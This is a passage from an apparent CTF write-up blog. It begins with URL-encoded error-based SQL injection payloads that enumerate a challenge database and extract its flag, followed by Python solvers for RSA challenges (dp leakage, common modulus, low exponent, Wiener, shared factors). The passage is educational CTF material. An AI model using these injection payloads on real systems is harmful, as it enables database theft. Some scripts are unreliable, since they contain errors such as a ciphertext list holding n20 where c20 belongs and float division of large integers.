2 3 4 5 6 7 8  # 注库 库名geek_sql %27+or+extractvalue%281%2Cconcat%280x7e%2C%28select+database%28%29%29%29%29+%23 # 注表 表名blog,fllllag %27+or+extractvalue%281%2Cconcat%280x7e%2C%28select+group_concat%28TABLE_NAME%29+from+information_schema.TABLES+where+TABLE_SCHEMA+%3D+%27geek_sql%27%29%29%29+%23 # 注列 列名id,fllllllag %27+or+extractvalue%281%2Cconcat%280x7e%2C%28select+group_concat%28COLUMN_NAME%29+from+information_schema.COLUMNS+where+TABLE_SCHEMA+%3D+%27geek_sql%27+and+TABLE_NAME%3D%27fllllag%27%29%29%29+%23 # 注flag flag{welcome_to_syclover} %27+or+extractvalue%281%2Cconcat%280x7e%2C%28select+fllllllag+from+geek_sql.fllllag+limit+2%2C1%29%29%29+%23   ","description":"","id":15,"section":"posts","tags":["CTF","WP"],"title":"第十一届极客大挑战Misc、Crypto题解","uri":"https://ruokeqx.gitee.io/posts/geek11/"},{"content":"摸了会鱼，学习一下RSA，没准下次能签个到。呜呜呜，太菜了。\nrsarsa 1 2 3 4 5 6 7 8 9  e = 65537 p = 9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483 q = 11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407 n = p*q C = 83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034 d = 56632047571190660567520341028861194862411428416862507034762587229995138605649836960220619903456392752115943299335385163216233744624623848874235303309636393446736347238627793022725260986466957974753004129210680401432377444984195145009801967391196615524488853620232925992387563270746297909112117451398527453977 m = pow(C,d,n) print(m)   RSA1 dp dq\n1 2 3 4 5 6 7 8 9 10 11 12 13  import gmpy2 from Crypto.Util.number import * p = 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229 q = 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469 dp = 6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929 dq = 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041 c = 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852 I = gmpy2.invert(q, p) mp = pow(c, dp, p) mq = pow(c, dq, q) m=(((mp-mq)*I)%p)*q+mq print(long_to_bytes(m))   RSA2 dp泄露\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  import gmpy2 from Crypto.Util.number import * e = 65537 n = 248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113 dp = 905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657 c = 140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751 for i in range(1,65538): if (dp*e-1)%i == 0: if n%(((dp*e-1)//i)+1)==0: p=((dp*e-1)//i)+1 q=n//(((dp*e-1)//i)+1) phi = (p-1)*(q-1) d = gmpy2.invert(e,phi)%phi m = pow(c,d,n) print(long_to_bytes(m))   RSA3 扩展欧几里得\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  # coding=utf-8 import gmpy2 from Crypto.Util.number import * n=22708078815885011462462049064339185898712439277226831073457888403129378547350292420267016551819052430779004755846649044001024141485283286483130702616057274698473611149508798869706347501931583117632710700787228016480127677393649929530416598686027354216422565934459015161927613607902831542857977859612596282353679327773303727004407262197231586324599181983572622404590354084541788062262164510140605868122410388090174420147752408554129789760902300898046273909007852818474030770699647647363015102118956737673941354217692696044969695308506436573142565573487583507037356944848039864382339216266670673567488871508925311154801 c1=22322035275663237041646893770451933509324701913484303338076210603542612758956262869640822486470121149424485571361007421293675516338822195280313794991136048140918842471219840263536338886250492682739436410013436651161720725855484866690084788721349555662019879081501113222996123305533009325964377798892703161521852805956811219563883312896330156298621674684353919547558127920925706842808914762199011054955816534977675267395009575347820387073483928425066536361482774892370969520740304287456555508933372782327506569010772537497541764311429052216291198932092617792645253901478910801592878203564861118912045464959832566051361 e1=11187289 c2=18702010045187015556548691642394982835669262147230212731309938675226458555210425972429418449273410535387985931036711854265623905066805665751803269106880746769003478900791099590239513925449748814075904017471585572848473556490565450062664706449128415834787961947266259789785962922238701134079720414228414066193071495304612341052987455615930023536823801499269773357186087452747500840640419365011554421183037505653461286732740983702740822671148045619497667184586123657285604061875653909567822328914065337797733444640351518775487649819978262363617265797982843179630888729407238496650987720428708217115257989007867331698397 e2=9647291 assert(gmpy2.gcd(e1,e2)==1) gcd, s, t = gmpy2.gcdext(e1, e2) s = - s c1 = gmpy2.invert(c1, n) ms = pow(c1, s, n) mt = pow(c2, t, n) m = ms*mt%n print(long_to_bytes(m))   Dangerous RSA 低指数攻击\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  import gmpy2 from Crypto.Util.number import * n = 0x52d483c27cd806550fbe0e37a61af2e7cf5e0efb723dfc81174c918a27627779b21fa3c851e9e94188eaee3d5cd6f752406a43fbecb53e80836ff1e185d3ccd7782ea846c2e91a7b0808986666e0bdadbfb7bdd65670a589a4d2478e9adcafe97c6ee23614bcb2ecc23580f4d2e3cc1ecfec25c50da4bc754dde6c8bfd8d1fc16956c74d8e9196046a01dc9f3024e11461c294f29d7421140732fedacac97b8fe50999117d27943c953f18c4ff4f8c258d839764078d4b6ef6e8591e0ff5563b31a39e6374d0d41c8c46921c25e5904a817ef8e39e5c9b71225a83269693e0b7e3218fc5e5a1e8412ba16e588b3d6ac536dce39fcdfce81eec79979ea6872793 e = 0x3 c = 0x10652cdfaa6b63f6d7bd1109da08181e500e5643f5b240a9024bfa84d5f2cac9310562978347bb232d63e7289283871efab83d84ff5a7b64a94a79d34cfbd4ef121723ba1f663e514f83f6f01492b4e13e1bb4296d96ea5a353d3bf2edd2f449c03c4a3e995237985a596908adc741f32365 k = 0 while True: res = gmpy2.iroot(c+k*n, 3) if res[1]==True: print(long_to_bytes(res[0])) break k = k+1   [HDCTF2019]basic rsa 真就rsa基础\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  import gmpy2 from Crypto.Util.number import * from binascii import a2b_hex,b2a_hex flag = \u0026#34;\u0026#34; p = 262248800182277040650192055439906580479 q = 262854994239322828547925595487519915551 e = 65533 n = p*q phi = (p-1)*(q-1) d = gmpy2.invert(e, phi) c = 27565231154623519221597938803435789010285480123476977081867877272451638645710 m = pow(c, d, n) print(long_to_bytes(m))   rsa2 Wiener\u0026rsquo;s Attack\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56  import ContinuedFractions, Arithmetic, RSAvulnerableKeyGenerator def hack_RSA(e,n): \u0026#39;\u0026#39;\u0026#39; Finds d knowing (e,n) applying the Wiener continued fraction attack \u0026#39;\u0026#39;\u0026#39; frac = ContinuedFractions.rational_to_contfrac(e, n) convergents = ContinuedFractions.convergents_from_contfrac(frac) for (k,d) in convergents: #check if d is actually the key if k!=0 and (e*d-1)%k == 0: phi = (e*d-1)//k s = n - phi + 1 # check if the equation x^2 - s*x + n = 0 # has integer roots discr = s*s - 4*n if(discr\u0026gt;=0): t = Arithmetic.is_perfect_square(discr) if t!=-1 and (s+t)%2==0: print(\u0026#34;Hacked!\u0026#34;) return d # TEST functions def test_hack_RSA(): print(\u0026#34;Testing Wiener Attack\u0026#34;) times = 5 while(times\u0026gt;0): e,n,d = RSAvulnerableKeyGenerator.generateKeys(1024) print(\u0026#34;(e,n) is (\u0026#34;, e, \u0026#34;, \u0026#34;, n, \u0026#34;)\u0026#34;) print(\u0026#34;d = \u0026#34;, d) hacked_d = hack_RSA(e, n) if d == hacked_d: print(\u0026#34;Hack WORKED!\u0026#34;) else: print(\u0026#34;Hack FAILED\u0026#34;) print(\u0026#34;d = \u0026#34;, d, \u0026#34;, hacked_d = \u0026#34;, hacked_d) print(\u0026#34;-------------------------\u0026#34;) times -= 1 if __name__ == \u0026#34;__main__\u0026#34;: N = 101991809777553253470276751399264740131157682329252673501792154507006158434432009141995367241962525705950046253400188884658262496534706438791515071885860897552736656899566915731297225817250639873643376310103992170646906557242832893914902053581087502512787303322747780420210884852166586717636559058152544979471 e = 46731919563265721307105180410302518676676135509737992912625092976849075262192092549323082367518264378630543338219025744820916471913696072050291990620486581719410354385121760761374229374847695148230596005409978383369740305816082770283909611956355972181848077519920922059268376958811713365106925235218265173085 hacked_d = hack_RSA(e, N) print(\u0026#34;d =\u0026#34;, hacked_d) import hashlib flag = \u0026#34;flag{\u0026#34; + hashlib.md5(hex(hacked_d)).hexdigest() + \u0026#34;}\u0026#34; print(flag)   [BJDCTF 2nd]rsa0 1 2 3 4 5 6 7 8 9 10 11 12 13  import gmpy2 from Crypto.Util.number import * e=16412969 # p+q=21474323937294223427029633006044232210144627658995261866208685988850000436515122573304502451444249691457249435728790344126596816839637513574593779046642132 # p-q=-3530704849939416130128795217866662706990139478488664405804918927334213577520082081558534570280645262486511199046994523103927323367477347680103067829901946 c = 66787387689969921866420074347299749477565324658007391062326189874749618152971805534966058181181742963789694672071035822688458412126937194610980555207839390188799347507006141157277940690848501622834024710740382183908481517573562946853585355166583862891066837397091757766328157130190310293512799363788698498081 q = 17943619087354807296900837788177569503154488180506597460403767061515786858995040491745967881163604428970738236681795821022669493472160165894490711216740186/2 p = 21474323937294223427029633006044232210144627658995261866208685988850000436515122573304502451444249691457249435728790344126596816839637513574593779046642132-q n = p*q phi = (p-1)*(q-1) d = gmpy2.invert(e, phi) m = pow(c, d, n) print(long_to_bytes(m))   RSA5 e较大 不适合开e次方\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77  import gmpy2 from Crypto.Util.number import * e = 65537 n1 = 20474918894051778533305262345601880928088284471121823754049725354072477155873778848055073843345820697886641086842612486541250183965966001591342031562953561793332341641334302847996108417466360688139866505179689516589305636902137210185624650854906780037204412206309949199080005576922775773722438863762117750429327585792093447423980002401200613302943834212820909269713876683465817369158585822294675056978970612202885426436071950214538262921077409076160417436699836138801162621314845608796870206834704116707763169847387223307828908570944984416973019427529790029089766264949078038669523465243837675263858062854739083634207 c1 = 974463908243330865728978769213595400782053398596897741316275722596415018912929508637393850919224969271766388710025195039896961956062895570062146947736340342927974992616678893372744261954172873490878805483241196345881721164078651156067119957816422768524442025688079462656755605982104174001635345874022133045402344010045961111720151990412034477755851802769069309069018738541854130183692204758761427121279982002993939745343695671900015296790637464880337375511536424796890996526681200633086841036320395847725935744757993013352804650575068136129295591306569213300156333650910795946800820067494143364885842896291126137320 n2 = 20918819960648891349438263046954902210959146407860980742165930253781318759285692492511475263234242002509419079545644051755251311392635763412553499744506421566074721268822337321637265942226790343839856182100575539845358877493718334237585821263388181126545189723429262149630651289446553402190531135520836104217160268349688525168375213462570213612845898989694324269410202496871688649978370284661017399056903931840656757330859626183773396574056413017367606446540199973155630466239453637232936904063706551160650295031273385619470740593510267285957905801566362502262757750629162937373721291789527659531499435235261620309759 c2 = 15819636201971185538694880505120469332582151856714070824521803121848292387556864177196229718923770810072104155432038682511434979353089791861087415144087855679134383396897817458726543883093567600325204596156649305930352575274039425470836355002691145864435755333821133969266951545158052745938252574301327696822347115053614052423028835532509220641378760800693351542633860702225772638930501021571415907348128269681224178300248272689705308911282208685459668200507057183420662959113956077584781737983254788703048275698921427029884282557468334399677849962342196140864403989162117738206246183665814938783122909930082802031855 n3 = 25033254625906757272369609119214202033162128625171246436639570615263949157363273213121556825878737923265290579551873824374870957467163989542063489416636713654642486717219231225074115269684119428086352535471683359486248203644461465935500517901513233739152882943010177276545128308412934555830087776128355125932914846459470221102007666912211992310538890654396487111705385730502843589727289829692152177134753098649781412247065660637826282055169991824099110916576856188876975621376606634258927784025787142263367152947108720757222446686415627479703666031871635656314282727051189190889008763055811680040315277078928068816491 c3 = 4185308529416874005831230781014092407198451385955677399668501833902623478395669279404883990725184332709152443372583701076198786635291739356770857286702107156730020004358955622511061410661058982622055199736820808203841446796305284394651714430918690389486920560834672316158146453183789412140939029029324756035358081754426645160033262924330248675216108270980157049705488620263485129480952814764002865280019185127662449318324279383277766416258142275143923532168798413011028271543085249029048997452212503111742302302065401051458066585395360468447460658672952851643547193822775218387853623453638025492389122204507555908862 n4 = 21206968097314131007183427944486801953583151151443627943113736996776787181111063957960698092696800555044199156765677935373149598221184792286812213294617749834607696302116136745662816658117055427803315230042700695125718401646810484873064775005221089174056824724922160855810527236751389605017579545235876864998419873065217294820244730785120525126565815560229001887622837549118168081685183371092395128598125004730268910276024806808565802081366898904032509920453785997056150497645234925528883879419642189109649009132381586673390027614766605038951015853086721168018787523459264932165046816881682774229243688581614306480751 c4 = 4521038011044758441891128468467233088493885750850588985708519911154778090597136126150289041893454126674468141393472662337350361712212694867311622970440707727941113263832357173141775855227973742571088974593476302084111770625764222838366277559560887042948859892138551472680654517814916609279748365580610712259856677740518477086531592233107175470068291903607505799432931989663707477017904611426213770238397005743730386080031955694158466558475599751940245039167629126576784024482348452868313417471542956778285567779435940267140679906686531862467627238401003459101637191297209422470388121802536569761414457618258343550613 n5 = 22822039733049388110936778173014765663663303811791283234361230649775805923902173438553927805407463106104699773994158375704033093471761387799852168337898526980521753614307899669015931387819927421875316304591521901592823814417756447695701045846773508629371397013053684553042185725059996791532391626429712416994990889693732805181947970071429309599614973772736556299404246424791660679253884940021728846906344198854779191951739719342908761330661910477119933428550774242910420952496929605686154799487839923424336353747442153571678064520763149793294360787821751703543288696726923909670396821551053048035619499706391118145067 c5 = 15406498580761780108625891878008526815145372096234083936681442225155097299264808624358826686906535594853622687379268969468433072388149786607395396424104318820879443743112358706546753935215756078345959375299650718555759698887852318017597503074317356745122514481807843745626429797861463012940172797612589031686718185390345389295851075279278516147076602270178540690147808314172798987497259330037810328523464851895621851859027823681655934104713689539848047163088666896473665500158179046196538210778897730209572708430067658411755959866033531700460551556380993982706171848970460224304996455600503982223448904878212849412357 n6 = 21574139855341432908474064784318462018475296809327285532337706940126942575349507668289214078026102682252713757703081553093108823214063791518482289846780197329821139507974763780260290309600884920811959842925540583967085670848765317877441480914852329276375776405689784571404635852204097622600656222714808541872252335877037561388406257181715278766652824786376262249274960467193961956690974853679795249158751078422296580367506219719738762159965958877806187461070689071290948181949561254144310776943334859775121650186245846031720507944987838489723127897223416802436021278671237227993686791944711422345000479751187704426369 c6 = 20366856150710305124583065375297661819795242238376485264951185336996083744604593418983336285185491197426018595031444652123288461491879021096028203694136683203441692987069563513026001861435722117985559909692670907347563594578265880806540396777223906955491026286843168637367593400342814725694366078337030937104035993569672959361347287894143027186846856772983058328919716702982222142848848117768499996617588305301483085428547267337070998767412540225911508196842253134355901263861121500650240296746702967594224401650220168780537141654489215019142122284308116284129004257364769474080721001708734051264841350424152506027932 n7 = 25360227412666612490102161131174584819240931803196448481224305250583841439581008528535930814167338381983764991296575637231916547647970573758269411168219302370541684789125112505021148506809643081950237623703181025696585998044695691322012183660424636496897073045557400768745943787342548267386564625462143150176113656264450210023925571945961405709276631990731602198104287528528055650050486159837612279600415259486306154947514005408907590083747758953115486124865486720633820559135063440942528031402951958557630833503775112010715604278114325528993771081233535247118481765852273252404963430792898948219539473312462979849137 c7 = 19892772524651452341027595619482734356243435671592398172680379981502759695784087900669089919987705675899945658648623800090272599154590123082189645021800958076861518397325439521139995652026377132368232502108620033400051346127757698623886142621793423225749240286511666556091787851683978017506983310073524398287279737680091787333547538239920607761080988243639547570818363788673249582783015475682109984715293163137324439862838574460108793714172603672477766831356411304446881998674779501188163600664488032943639694828698984739492200699684462748922883550002652913518229322945040819064133350314536378694523704793396169065179 n8 = 22726855244632356029159691753451822163331519237547639938779517751496498713174588935566576167329576494790219360727877166074136496129927296296996970048082870488804456564986667129388136556137013346228118981936899510687589585286517151323048293150257036847475424044378109168179412287889340596394755257704938006162677656581509375471102546261355748251869048003600520034656264521931808651038524134185732929570384705918563982065684145766427962502261522481994191989820110575981906998431553107525542001187655703534683231777988419268338249547641335718393312295800044734534761692799403469497954062897856299031257454735945867491191 c8 = 6040119795175856407541082360023532204614723858688636724822712717572759793960246341800308149739809871234313049629732934797569781053000686185666374833978403290525072598774001731350244744590772795701065129561898116576499984185920661271123665356132719193665474235596884239108030605882777868856122378222681140570519180321286976947154042272622411303981011302586225630859892731724640574658125478287115198406253847367979883768000812605395482952698689604477719478947595442185921480652637868335673233200662100621025061500895729605305665864693122952557361871523165300206070325660353095592778037767395360329231331322823610060006 n9 = 23297333791443053297363000786835336095252290818461950054542658327484507406594632785712767459958917943095522594228205423428207345128899745800927319147257669773812669542782839237744305180098276578841929496345963997512244219376701787616046235397139381894837435562662591060768476997333538748065294033141610502252325292801816812268934171361934399951548627267791401089703937389012586581080223313060159456238857080740699528666411303029934807011214953984169785844714159627792016926490955282697877141614638806397689306795328344778478692084754216753425842557818899467945102646776342655167655384224860504086083147841252232760941 c9 = 5418120301208378713115889465579964257871814114515046096090960159737859076829258516920361577853903925954198406843757303687557848302302200229295916902430205737843601806700738234756698575708612424928480440868739120075888681672062206529156566421276611107802917418993625029690627196813830326369874249777619239603300605876865967515719079797115910578653562787899019310139945904958024882417833736304894765433489476234575356755275147256577387022873348906900149634940747104513850154118106991137072643308620284663108283052245750945228995387803432128842152251549292698947407663643895853432650029352092018372834457054271102816934 n10 = 28873667904715682722987234293493200306976947898711255064125115933666968678742598858722431426218914462903521596341771131695619382266194233561677824357379805303885993804266436810606263022097900266975250431575654686915049693091467864820512767070713267708993899899011156106766178906700336111712803362113039613548672937053397875663144794018087017731949087794894903737682383916173267421403408140967713071026001874733487295007501068871044649170615709891451856792232315526696220161842742664778581287321318748202431466508948902745314372299799561625186955234673012098210919745879882268512656931714326782335211089576897310591491 c10 = 9919880463786836684987957979091527477471444996392375244075527841865509160181666543016317634963512437510324198702416322841377489417029572388474450075801462996825244657530286107428186354172836716502817609070590929769261932324275353289939302536440310628698349244872064005700644520223727670950787924296004296883032978941200883362653993351638545860207179022472492671256630427228461852668118035317021428675954874947015197745916918197725121122236369382741533983023462255913924692806249387449016629865823316402366017657844166919846683497851842388058283856219900535567427103603869955066193425501385255322097901531402103883869 n11 = 22324685947539653722499932469409607533065419157347813961958075689047690465266404384199483683908594787312445528159635527833904475801890381455653807265501217328757871352731293000303438205315816792663917579066674842307743845261771032363928568844669895768092515658328756229245837025261744260614860746997931503548788509983868038349720225305730985576293675269073709022350700836510054067641753713212999954307022524495885583361707378513742162566339010134354907863733205921845038918224463903789841881400814074587261720283879760122070901466517118265422863420376921536734845502100251460872499122236686832189549698020737176683019 c11 = 1491527050203294989882829248560395184804977277747126143103957219164624187528441047837351263580440686474767380464005540264627910126483129930668344095814547592115061057843470131498075060420395111008619027199037019925701236660166563068245683975787762804359520164701691690916482591026138582705558246869496162759780878437137960823000043988227303003876410503121370163303711603359430764539337597866862508451528158285103251810058741879687875218384160282506172706613359477657215420734816049393339593755489218588796607060261897905233453268671411610631047340459487937479511933450369462213795738933019001471803157607791738538467 n12 = 27646746423759020111007828653264027999257847645666129907789026054594393648800236117046769112762641778865620892443423100189619327585811384883515424918752749559627553637785037359639801125213256163008431942593727931931898199727552768626775618479833029101249692573716030706695702510982283555740851047022672485743432464647772882314215176114732257497240284164016914018689044557218920300262234652840632406067273375269301008409860193180822366735877288205783314326102263756503786736122321348320031950012144905869556204017430593656052867939493633163499580242224763404338807022510136217187779084917996171602737036564991036724299 c12 = 21991524128957260536043771284854920393105808126700128222125856775506885721971193109361315961129190814674647136464887087893990660894961612838205086401018885457667488911898654270235561980111174603323721280911197488286585269356849579263043456316319476495888696219344219866516861187654180509247881251251278919346267129904739277386289240394384575124331135655943513831009934023397457082184699737734388823763306805326430395849935770213817533387235486307008892410920611669932693018165569417445885810825749609388627231235840912644654685819620931663346297596334834498661789016450371769203650109994771872404185770230172934013971 n13 = 20545487405816928731738988374475012686827933709789784391855706835136270270933401203019329136937650878386117187776530639342572123237188053978622697282521473917978282830432161153221216194169879669541998840691383025487220850872075436064308499924958517979727954402965612196081404341651517326364041519250125036424822634354268773895465698920883439222996581226358595873993976604699830613932320720554130011671297944433515047180565484495191003887599891289037982010216357831078328159028953222056918189365840711588671093333013117454034313622855082795813122338562446223041211192277089225078324682108033843023903550172891959673551 c13 = 14227439188191029461250476692790539654619199888487319429114414557975376308688908028140817157205579804059783807641305577385724758530138514972962209062230576107406142402603484375626077345190883094097636019771377866339531511965136650567412363889183159616188449263752475328663245311059988337996047359263288837436305588848044572937759424466586870280512424336807064729894515840552404756879590698797046333336445465120445087587621743906624279621779634772378802959109714400516183718323267273824736540168545946444437586299214110424738159957388350785999348535171553569373088251552712391288365295267665691357719616011613628772175 n14 = 27359727711584277234897157724055852794019216845229798938655814269460046384353568138598567755392559653460949444557879120040796798142218939251844762461270251672399546774067275348291003962551964648742053215424620256999345448398805278592777049668281558312871773979931343097806878701114056030041506690476954254006592555275342579529625231194321357904668512121539514880704046969974898412095675082585315458267591016734924646294357666924293908418345508902112711075232047998775303603175363964055048589769318562104883659754974955561725694779754279606726358588862479198815999276839234952142017210593887371950645418417355912567987 c14 = 3788529784248255027081674540877016372807848222776887920453488878247137930578296797437647922494510483767651150492933356093288965943741570268943861987024276610712717409139946409513963043114463933146088430004237747163422802959250296602570649363016151581364006795894226599584708072582696996740518887606785460775851029814280359385763091078902301957226484620428513604630585131511167015763190591225884202772840456563643159507805711004113901417503751181050823638207803533111429510911616160851391754754434764819568054850823810901159821297849790005646102129354035735350124476838786661542089045509656910348676742844957008857457 n15 = 27545937603751737248785220891735796468973329738076209144079921449967292572349424539010502287564030116831261268197384650511043068738911429169730640135947800885987171539267214611907687570587001933829208655100828045651391618089603288456570334500533178695238407684702251252671579371018651675054368606282524673369983034682330578308769886456335818733827237294570476853673552685361689144261552895758266522393004116017849397346259119221063821663280935820440671825601452417487330105280889520007917979115568067161590058277418371493228631232457972494285014767469893647892888681433965857496916110704944758070268626897045014782837 c15 = 14069112970608895732417039977542732665796601893762401500878786871680645798754783315693511261740059725171342404186571066972546332813667711135661176659424619936101038903439144294886379322591635766682645179888058617577572409307484708171144488708410543462972008179994594087473935638026612679389759756811490524127195628741262871304427908481214992471182859308828778119005750928935764927967212343526503410515793717201360360437981322576798056276657140363332700714732224848346808963992302409037706094588964170239521193589470070839790404597252990818583717869140229811712295005710540476356743378906642267045723633874011649259842 n16 = 25746162075697911560263181791216433062574178572424600336856278176112733054431463253903433128232709054141607100891177804285813783247735063753406524678030561284491481221681954564804141454666928657549670266775659862814924386584148785453647316864935942772919140563506305666207816897601862713092809234429096584753263707828899780979223118181009293655563146526792388913462557306433664296966331469906428665127438829399703002867800269947855869262036714256550075520193125987011945192273531732276641728008406855871598678936585324782438668746810516660152018244253008092470066555687277138937298747951929576231036251316270602513451 c16 = 17344284860275489477491525819922855326792275128719709401292545608122859829827462088390044612234967551682879954301458425842831995513832410355328065562098763660326163262033200347338773439095709944202252494552172589503915965931524326523663289777583152664722241920800537867331030623906674081852296232306336271542832728410803631170229642717524942332390842467035143631504401140727083270732464237443915263865880580308776111219718961746378842924644142127243573824972533819479079381023103585862099063382129757560124074676150622288706094110075567706403442920696472627797607697962873026112240527498308535903232663939028587036724 n17 = 23288486934117120315036919418588136227028485494137930196323715336208849327833965693894670567217971727921243839129969128783853015760155446770590696037582684845937132790047363216362087277861336964760890214059732779383020349204803205725870225429985939570141508220041286857810048164696707018663758416807708910671477407366098883430811861933014973409390179948577712579749352299440310543689035651465399867908428885541237776143404376333442949397063249223702355051571790555151203866821867908531733788784978667478707672984539512431549558672467752712004519300318999208102076732501412589104904734983789895358753664077486894529499 c17 = 10738254418114076548071448844964046468141621740603214384986354189105236977071001429271560636428075970459890958274941762528116445171161040040833357876134689749846940052619392750394683504816081193432350669452446113285638982551762586656329109007214019944975816434827768882704630460001209452239162896576191876324662333153835533956600295255158377025198426950944040643235430211011063586032467724329735785947372051759042138171054165854842472990583800899984893232549092766400510300083585513014171220423103452292891496141806956300396540682381668367564569427813092064053993103537635994311143010708814851867239706492577203899024 n18 = 19591441383958529435598729113936346657001352578357909347657257239777540424811749817783061233235817916560689138344041497732749011519736303038986277394036718790971374656832741054547056417771501234494768509780369075443550907847298246275717420562375114406055733620258777905222169702036494045086017381084272496162770259955811174440490126514747876661317750649488774992348005044389081101686016446219264069971370646319546429782904810063020324704138495608761532563310699753322444871060383693044481932265801505819646998535192083036872551683405766123968487907648980900712118052346174533513978009131757167547595857552370586353973 c18 = 3834917098887202931981968704659119341624432294759361919553937551053499607440333234018189141970246302299385742548278589896033282894981200353270637127213483172182529890495903425649116755901631101665876301799865612717750360089085179142750664603454193642053016384714515855868368723508922271767190285521137785688075622832924829248362774476456232826885801046969384519549385428259591566716890844604696258783639390854153039329480726205147199247183621535172450825979047132495439603840806501254997167051142427157381799890725323765558803808030109468048682252028720241357478614704610089120810367192414352034177484688502364022887 n19 = 19254242571588430171308191757871261075358521158624745702744057556054652332495961196795369630484782930292003238730267396462491733557715379956969694238267908985251699834707734400775311452868924330866502429576951934279223234676654749272932769107390976321208605516299532560054081301829440688796904635446986081691156842271268059970762004259219036753174909942343204432795076377432107630203621754552804124408792358220071862369443201584155711893388877350138023238624566616551246804054720492816226651467017802504094070614892556444425915920269485861799532473383304622064493223627552558344088839860178294589481899206318863310603 c19 = 6790553533991297205804561991225493105312398825187682250780197510784765226429663284220400480563039341938599783346724051076211265663468643826430109013245014035811178295081939958687087477312867720289964506097819762095244479129359998867671811819738196687884696680463458661374310994610760009474264115750204920875527434486437536623589684519411519100170291423367424938566820315486507444202022408003879118465761273916755290898112991525546114191064022991329724370064632569903856189236177894007766690782630247443895358893983735822824243487181851098787271270256780891094405121947631088729917398317652320497765101790132679171889 n20 = 26809700251171279102974962949184411136459372267620535198421449833298448092580497485301953796619185339316064387798092220298630428207556482805739803420279056191194360049651767412572609187680508073074653291350998253938793269214230457117194434853888765303403385824786231859450351212449404870776320297419712486574804794325602760347306432927281716160368830187944940128907971027838510079519466846176106565164730963988892400240063089397720414921398936399927948235195085202171264728816184532651138221862240969655185596628285814057082448321749567943946273776184657698104465062749244327092588237927996419620170254423837876806659 c20 = 386213556608434013769864727123879412041991271528990528548507451210692618986652870424632219424601677524265011043146748309774067894985069288067952546139416819404039688454756044862784630882833496090822568580572859029800646671301748901528132153712913301179254879877441322285914544974519727307311002330350534857867516466612474769753577858660075830592891403551867246057397839688329172530177187042229028685862036140779065771061933528137423019407311473581832405899089709251747002788032002094495379614686544672969073249309703482556386024622814731015767810042969813752548617464974915714425595351940266077021672409858645427346 n=[n1,n2,n3,n4,n5,n6,n7,n8,n9,n10,n11,n12,n13,n14,n15,n16,n17,n18,n19,n20] c=[c1,c2,c3,c4,c5,c6,c7,c8,c9,c10,c11,c12,c13,c14,c15,c16,c17,c18,c19,n20] for i in range(len(n)): for j in range(len(n)): if(i!=j): if(gmpy2.gcd(n[i],n[j])!=1): print(i,j) p = gmpy2.gcd(n[i],n[j]) q = n[i]//p phi = (p-1)*(q-1) d = gmpy2.invert(e, phi) print(long_to_bytes(pow(c[i],d,n[i])))   [GUET-CTF2019]BabyRSA 数学基础\n1 2 3 4 5 6 7 8 9 10  import gmpy2 from Crypto.Util.number import * pandq = 0x1232fecb92adead91613e7d9ae5e36fe6bb765317d6ed38ad890b4073539a6231a6620584cea5730b5af83a3e80cf30141282c97be4400e33307573af6b25e2ea pand1plusqand1 = 0x5248becef1d925d45705a7302700d6a0ffe5877fddf9451a9c1181c4d82365806085fd86fbaab08b6fc66a967b2566d743c626547203b34ea3fdb1bc06dd3bb765fd8b919e3bd2cb15bc175c9498f9d9a0e216c2dde64d81255fa4c05a1ee619fc1fc505285a239e7bc655ec6605d9693078b800ee80931a7a0c84f33c851740 e = 0xe6b1bee47bd63f615c7d0a43c529d219 d = 0x2dde7fbaed477f6d62838d55b0d0964868cf6efb2c282a5f13e6008ce7317a24cb57aec49ef0d738919f47cdcd9677cd52ac2293ec5938aa198f962678b5cd0da344453f521a69b2ac03647cdd8339f4e38cec452d54e60698833d67f9315c02ddaa4c79ebaa902c605d7bda32ce970541b2d9a17d62b52df813b2fb0c5ab1a5 c = 0x50ae00623211ba6089ddfae21e204ab616f6c9d294e913550af3d66e85d0c0693ed53ed55c46d8cca1d7c2ad44839030df26b70f22a8567171a759b76fe5f07b3c5a6ec89117ed0a36c0950956b9cde880c575737f779143f921d745ac3bb0e379c05d9a3cc6bf0bea8aa91e4d5e752c7eb46b2e023edbc07d24a7c460a34a9a n = pand1plusqand1-pandq-0x1 print(long_to_bytes(pow(c,d,n)))   [BJDCTF 2nd]rsa1 z3一把梭\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  import gmpy2 from z3 import * from Crypto.Util.number import * s = Solver() p = Int(\u0026#39;p\u0026#39;) q = 